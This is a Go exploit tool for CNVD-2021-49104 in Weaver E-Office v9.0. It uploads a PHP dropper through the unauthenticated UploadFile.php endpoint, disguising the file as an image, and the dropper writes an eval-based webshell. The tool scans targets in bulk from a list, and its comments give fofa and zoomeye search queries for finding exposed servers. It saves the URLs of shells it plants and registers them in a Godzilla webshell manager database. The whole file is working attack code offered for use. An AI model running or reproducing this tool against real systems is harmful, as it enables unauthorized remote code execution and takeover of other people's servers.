package main

/**
* 泛微E-Office v9.0 exp  CNVD-2021-49104
* @Author: rootk1t
* @Date: 2021-12-02
 */

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"database/sql"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)

var (
	target     string
	uploadfile string
	targetfile string
	shellName  string
	output     string
	Godzilla   bool
	//verifyStr     string
	WarnOutput    *color.Color = color.New(color.FgRed, color.Bold)
	SuccessOutput *color.Color = color.New(color.FgGreen, color.Bold)
)

func init() {
	flag.StringVar(&target, "t", "", "目标地址")
	flag.StringVar(&targetfile, "tf", "", "批量测试目标文件")
	flag.StringVar(&uploadfile, "uf", "", "需要上传的文件,默认将写入一句话webshell")
	flag.StringVar(&output, "o", "results.txt", "将结果写到指定的文件中")
	flag.BoolVar(&Godzilla, "g", false, "将godzilla的webshell写到data.db数据库中(default: false)")
	flag.Parse()
}

func main() {
	/*
		fofa app="泛微-EOffice"
		zoomeye app:"泛微协同办公标准产品EOffice"
	*/
	poc()
}

func poc() {
	if targetfile == "" && target == "" {
		log.Fatalln("未指定目标文件或目标url")
	}
	if target != "" {
		uploadFile(target)
		return
	}
	if targetfile == "" {
		return
	}

	f, err := os.Open(targetfile)
	if err != nil {
		log.Fatalln("打开目标文件出错.")
	}
	reader := bufio.NewReader(f)
	var i int = 1

	for {
		var line []byte
		var err error
		if line, _, err = reader.ReadLine(); err != nil {
			break
		}
		if strings.Trim(string(line), "\n") == "" {
			continue
		}

		log.Printf("[%d]正在检测：%s", i, line)
		uploadFile(string(line))
		i += 1
		if err == io.EOF {
			err = nil
		}
	}
}

func uploadFile(t string) {
	path := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
	t = strings.TrimRight(t, "/")
	client := createHttpClient()
	targetUrl := t + path
	shellName = getRandString(10) + ".php" //利用随机字符作文件名，避免冲突
	payload := getPayload(shellName)

	//构造multipart
	body := &bytes.Buffer{}
	//fmt.Println(payload)
	writer := multipart.NewWriter(body)
	w, _ := createImageFormFile(writer, "test.php")
	w.Write([]byte(payload))
	w.Write([]byte("\n\n--" + writer.Boundary() + "--"))
	defer writer.Close()

	req, _ := http.NewRequest("POST", targetUrl, body)
	req.Header.Add("Content-Type", "multipart/form-data; boundary="+writer.Boundary())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0")
	req.Header.Set("Accept-Language", "zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6")

	resp, err := client.Do(req)
	if err != nil {
		log.Println("请求出错", err.Error())
		return
	}
	defer resp.Body.Close()

	data, _ := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(data))
	if strings.Contains(string(data), "logo-eoffice.php") {
		checkUploadFile(t, shellName)
	} else {
		WarnOutput.Println("上传文件失败", string(data))
	}

}

func createImageFormFile(w *multipart.Writer, filename string) (io.Writer, error) {
	//设置multipart的content-type为image/jpeg，不然会自动根据body来确定.
	mime := make(textproto.MIMEHeader)
	mime.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, "Filedata", "shell.php"))
	mime.Set("Content-Type", "image/jpeg")
	return w.CreatePart(mime)
}

func createHttpClient() *http.Client {
	//uri, _ := url.Parse("http://127.0.0.1:8080") //代理到burp进行调试
	httpclient := &http.Client{
		Timeout: time.Duration(time.Second * 10),
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			//Proxy: http.ProxyURL(uri),
		},
	}
	return httpclient
}

func getPayload(fn string) string {
	//verifyStr = getRandString(32) + "\n"
	evilCode := "<?php @eval($_POST[\"cmd\"]);?>"
	if uploadfile == "" {
		//没有指定文件，尝试写入一句话
		WarnOutput.Println("未指定文件，使用以下payload")
		fmt.Println(evilCode)
	} else {
		f, err := os.Open(uploadfile)
		if err != nil {
			log.Println("打开文件错误....")
		}
		defer f.Close()

		data, err := ioutil.ReadAll(f)
		if err != nil {
			log.Println("读取文件错误...")
		}
		evilCode = string(data)
	}

	evilCode = base64.StdEncoding.EncodeToString([]byte(evilCode)) //写php代码时最好用base64，不然会出现一些问题。
	return fmt.Sprintf("<?php $f=fopen(\"%s\", \"w\");$d='%s';fwrite($f, base64_decode($d));fclose($f);?>", fn, evilCode)
}

func getRandString(n int) string {

	if n <= 0 {
		n = 10
	}
	bytes := make([]byte, n)

	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < n; i++ {
		b := r.Intn(26) + 97
		bytes[i] = byte(b)
	}
	return string(bytes)
}

func checkUploadFile(u string, sn string) {
	path := "/images/logo/"
	client := createHttpClient()
	shellUrl := u + path + "logo-eoffice.php"
	resp, err := client.Post(shellUrl, "Content-Type: text/html", nil)
	if err != nil {
		WarnOutput.Println("上传失败...", err.Error())
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		WarnOutput.Println("利用失败，返回码：", resp.StatusCode)
		return
	}
	//如果存在logo-eoffice.php并请求一次，执行写文件payload
	webshell := u + path + sn
	//fmt.Println(webshell)
	req, _ := http.NewRequest("GET", webshell, nil)
	resp, err = client.Do(req)
	if err != nil {
		WarnOutput.Print("写入webshell失败")
		return
	}
	defer resp.Body.Close()
	//data, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK {
		if Godzilla {
			godzilla(webshell)
		}
		saveResults(output, webshell)
		SuccessOutput.Println("利用成功, webshell地址：", webshell)
		return
	}
	WarnOutput.Println("写入webshell失败")
}

func saveResults(filename string, res string) {
	if _, err := os.Stat(filename); !os.IsNotExist(err) {
		f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, 0666)
		if err != nil {
			log.Fatalln("不能打开文件：", filename)
		}
		defer f.Close()
		n, err := io.WriteString(f, res+"\n")
		if err != nil {
			log.Println("保存结果失败..", n)
		} else {
			log.Println("保存结果成功..")
		}
		return
	}

	f, err := os.Create(filename)
	if err != nil {
		log.Println("创建output文件出错：", filename)
		return
	}
	defer f.Close()
	io.WriteString(f, res+"\n")

}

//将webshell写入数据库

func godzilla(u string) {
	//生成的是Godzilla马时将webshell url 写入数据库。
	var (
		Id          string
		Url         string
		Password    string
		SecretKey   string
		Payload     string
		Cryption    string
		Encoding    string
		Headers     string
		ReqLeft     string
		ReqRight    string
		ConnTimeout int
		ReadTimeout int
		ProxyType   string
		ProxyHost   string
		Remark      string
		Note        string
		CreateTime  string
		UpdateTime  string
		ProxyPort   string
	)

	db, err := sql.Open("sqlite3", "./data.db")

	if err != nil {
		log.Println("连接数据库失败。")
		return
	}
	Url = u

	stmt, _ := db.Prepare("INSERT INTO \"shell\"(\"id\", \"url\", \"password\", \"secretKey\", \"payload\", \"cryption\", \"encoding\", \"headers\", \"reqLeft\", \"reqRight\", \"connTimeout\", \"readTimeout\", \"proxyType\", \"proxyHost\", \"proxyPort\", \"remark\", \"note\", \"createTime\", \"updateTime\") VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")

	Id = uuid.New().String()
	Password = "pass"
	SecretKey = "key"
	Payload = "PhpDynamicPayload"
	Cryption = "PHP_XOR_BASE64"
	Encoding = "UTF-8"
	Headers = `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
	`
	ReqLeft = ""
	ReqRight = ""
	ConnTimeout = 3000
	ReadTimeout = 60000
	ProxyType = "NO_PROXY"
	ProxyHost = "127.0.0.1"
	ProxyPort = "8888"
	Remark = "备注"
	Note = ""
	CreateTime = time.Now().Format("2006-01-02 15:04:05")
	UpdateTime = time.Now().Format("2006-01-02 15:04:05")

	log.Println("写入数据库...")
	res, err := stmt.Exec(Id, Url, Password, SecretKey, Payload, Cryption, Encoding, Headers, ReqLeft, ReqRight, ConnTimeout, ReadTimeout, ProxyType, ProxyHost, ProxyPort, Remark, Note, CreateTime, UpdateTime)
	if err != nil {
		log.Println("插入数据失败...", err.Error())
		return
	}

	lidx, err := res.LastInsertId()

	if err != nil {
		log.Println("插入数据失败...", err.Error())
		return
	}

	fmt.Println(lidx)

	defer db.Close()
}
